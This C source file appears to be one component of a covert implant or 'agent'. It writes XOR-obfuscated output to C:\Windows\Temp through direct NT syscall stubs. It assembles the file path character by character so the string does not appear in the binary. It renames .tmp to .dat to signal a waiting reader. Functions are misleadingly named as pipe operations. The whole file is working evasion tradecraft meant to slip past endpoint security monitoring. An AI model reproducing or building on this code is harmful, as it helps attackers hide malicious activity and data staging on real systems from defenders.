/**
 * File-based output via NT syscalls only.
 * Uses NtCreateFile, NtWriteFile, NtFlushBuffersFile, NtSetInformationFile.
 * Wire data is XOR-encrypted with the output name as key.
 * Agent writes to .tmp, renames to .dat on completion to signal readiness.
 */

#include <windows.h>
#include "../include/ntdefs.h"
#include "../include/syscalls.h"
#include "../include/agent.h"

static wchar_t g_tmp_path[280];
static int g_tmp_len = 0;
static wchar_t g_dat_path[280];
static int g_dat_len = 0;

static int build_output_path(wchar_t *buf, const wchar_t *name, wchar_t ext0, wchar_t ext1, wchar_t ext2) {
    int off = 0;
    buf[off++] = L'\\'; buf[off++] = L'?'; buf[off++] = L'?'; buf[off++] = L'\\';
    buf[off++] = L'C';  buf[off++] = L':'; buf[off++] = L'\\';
    buf[off++] = L'W';  buf[off++] = L'i'; buf[off++] = L'n'; buf[off++] = L'd';
    buf[off++] = L'o';  buf[off++] = L'w'; buf[off++] = L's'; buf[off++] = L'\\';
    buf[off++] = L'T';  buf[off++] = L'e'; buf[off++] = L'm'; buf[off++] = L'p';
    buf[off++] = L'\\';

    const wchar_t *s = name;
    while (*s && off < 272) {
        buf[off++] = *s++;
    }

    buf[off++] = L'.';
    buf[off++] = ext0;
    buf[off++] = ext1;
    buf[off++] = ext2;
    buf[off] = L'\0';
    return off;
}

HANDLE open_named_pipe(const wchar_t *name) {
    g_tmp_len = build_output_path(g_tmp_path, name, L't', L'm', L'p');
    g_dat_len = build_output_path(g_dat_path, name, L'd', L'a', L't');

    UNICODE_STRING us;
    us.Length = (USHORT)(g_tmp_len * sizeof(wchar_t));
    us.MaximumLength = (USHORT)((g_tmp_len + 1) * sizeof(wchar_t));
    us.Buffer = g_tmp_path;

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE, NULL, NULL);

    IO_STATUS_BLOCK iosb;
    HANDLE hFile = NULL;

    NTSTATUS status = sys_NtCreateFile(
        &hFile,
        0x40110000,  /* GENERIC_WRITE | DELETE | SYNCHRONIZE */
        &oa, &iosb, NULL,
        FILE_ATTRIBUTE_NORMAL,
        0,
        FILE_OVERWRITE_IF,
        FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
        NULL, 0
    );

    if (!NT_SUCCESS(status)) return NULL;
    return hFile;
}

/* XOR cipher state */
static const wchar_t *g_xor_key = NULL;
static DWORD g_xor_pos = 0;
static int g_xor_klen = 0;

void init_pipe_cipher(const wchar_t *key) {
    g_xor_key = key;
    g_xor_pos = 0;
    g_xor_klen = 0;
    while (key[g_xor_klen]) g_xor_klen++;
}

BOOL write_pipe(HANDLE file, const void *data, DWORD size) {
    BYTE *src = (BYTE *)data;

    if (g_xor_key && g_xor_klen > 0) {
        BYTE buf[2048];
        DWORD off = 0;
        while (off < size) {
            DWORD chunk = size - off;
            if (chunk > sizeof(buf)) chunk = sizeof(buf);
            for (DWORD i = 0; i < chunk; i++)
                buf[i] = src[off + i] ^ (BYTE)g_xor_key[g_xor_pos++ % g_xor_klen];
            IO_STATUS_BLOCK iosb;
            NTSTATUS status = sys_NtWriteFile(file, NULL, NULL, NULL, &iosb,
                                               buf, chunk, NULL, NULL);
            if (!NT_SUCCESS(status)) return FALSE;
            off += chunk;
        }
        return TRUE;
    }

    IO_STATUS_BLOCK iosb;
    NTSTATUS status = sys_NtWriteFile(file, NULL, NULL, NULL, &iosb,
                                       (PVOID)data, size, NULL, NULL);
    return NT_SUCCESS(status);
}

void close_pipe(HANDLE file) {
    IO_STATUS_BLOCK iosb;
    sys_NtFlushBuffersFile(file, &iosb);

    /* Rename .tmp → .dat to signal completion */
    /* FileRenameInformation: ReplaceIfExists(1) + pad(7) + RootDirectory(8) + FileNameLength(4) + FileName */
    BYTE rename_buf[sizeof(ULONGLONG) + sizeof(HANDLE) + sizeof(ULONG) + 280 * sizeof(wchar_t)];
    for (int i = 0; i < (int)sizeof(rename_buf); i++) rename_buf[i] = 0;

    rename_buf[0] = 1; /* ReplaceIfExists = TRUE */

    /* RootDirectory at offset 8 = NULL (absolute path) */

    /* FileNameLength at offset 16 */
    ULONG name_bytes = (ULONG)(g_dat_len * sizeof(wchar_t));
    *(ULONG *)&rename_buf[16] = name_bytes;

    /* FileName at offset 20 */
    wchar_t *dst = (wchar_t *)&rename_buf[20];
    for (int i = 0; i < g_dat_len; i++) {
        dst[i] = g_dat_path[i];
    }

    ULONG info_size = 20 + name_bytes;
    sys_NtSetInformationFile(file, &iosb, rename_buf, info_size, FileRenameInformation);

    sys_NtClose(file);
}
